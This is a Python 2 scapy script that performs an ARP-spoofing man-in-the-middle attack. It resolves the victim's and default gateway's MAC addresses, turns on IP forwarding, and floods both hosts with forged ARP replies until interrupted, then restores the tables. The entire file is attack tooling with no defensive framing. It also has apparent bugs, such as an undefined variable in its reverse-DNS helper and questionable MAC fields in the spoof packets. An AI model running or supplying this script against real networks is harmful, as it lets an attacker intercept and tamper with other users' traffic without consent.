from scapy.all import *
import sys
import os
import netifaces
import socket
from colorama import Fore, Style, init
init()

class c:
	g = Fore.GREEN + Style.BRIGHT
	w = Fore.WHITE + Style.BRIGHT
	r = Fore.RED + Style.BRIGHT
	y = Fore.YELLOW + Style.BRIGHT

def revDNS(addr):
	try:
		s = socket.gethostbyaddr(ip)
		return s[0]
	except:
		return 'Unknown'

def reARP(rtrIP, tgtIP, tgtMac, rtrMac):
	send(Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op=2, pdst=rtrIP, psrc=tgtIP, hwsrc=tgtMac, hwdst='ff:ff:ff:ff:ff:ff'), count = 4, verbose=0)
	send(Ether(dst = 'ff:ff:ff:ff:ff:ff')/ARP(op=2, pdst=tgtIP, psrc=rtrIP, hwsrc=rtrMac, hwdst='ff:ff:ff:ff:ff:ff'), count = 4, verbose=0)

def spoof(rtrIP, tgtIP, tgtMac, rtrMac):
	global pktnum
	send(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=2, pdst=tgtIP, psrc=rtrIP, hwsrc=tgtMac), verbose=0)
	send(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=2, pdst=rtrIP, psrc=tgtIP, hwsrc=rtrMac), verbose=0)
	pktnum += 1

def getMac(target):
	pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1,hwdst="ff:ff:ff:ff:ff:ff", pdst=target)
	try:
		ans,unans = srp(pkt, verbose=0)
	except KeyboardInterrupt:
		sys.exit()
	for s,r in ans:
		return r[Ether].src

def mitm(rtrIP, tgtIP, tgtMac, rtrMac):
	global pktnum
	pktnum = 0
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	while True:
		try:
			spoof(rtrIP, tgtIP, tgtMac, rtrMac)
			sys.stdout.write("\r" + 'Sent %s ARP packets to %s(%s/%s)'%(c.g+str(pktnum)+c.w,c.g+tgtIP+c.w,c.g+tgtMac+c.w,c.g+revDNS(tgtIP)+c.w))
			sys.stdout.flush()
		except KeyboardInterrupt:
			try:
				print '\nRe-Arping...'
				reARP(rtrIP, tgtIP, tgtMac, rtrMac)
				os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
				sys.exit()
			except KeyboardInterrupt:
				pass

def main():
	victim = sys.argv[1]
	router = str(netifaces.gateways()['default'][2][0])
	conf.iface = netifaces.gateways()['default'][2][1]
	print 'Using default interface: ' + c.g+conf.iface+c.w
	print Style.BRIGHT + 'Getting MAC addresses...'
	targetMac = getMac(victim)
	try:
		print 'Found target at: %s'%(c.g+targetMac+c.w)
	except:
		sys.exit()
	routerMac = getMac(router)
	print 'Found router at: %s'%(c.g+routerMac+c.w)
	mitm(router, victim, targetMac, routerMac)

if __name__ == '__main__':
	main()

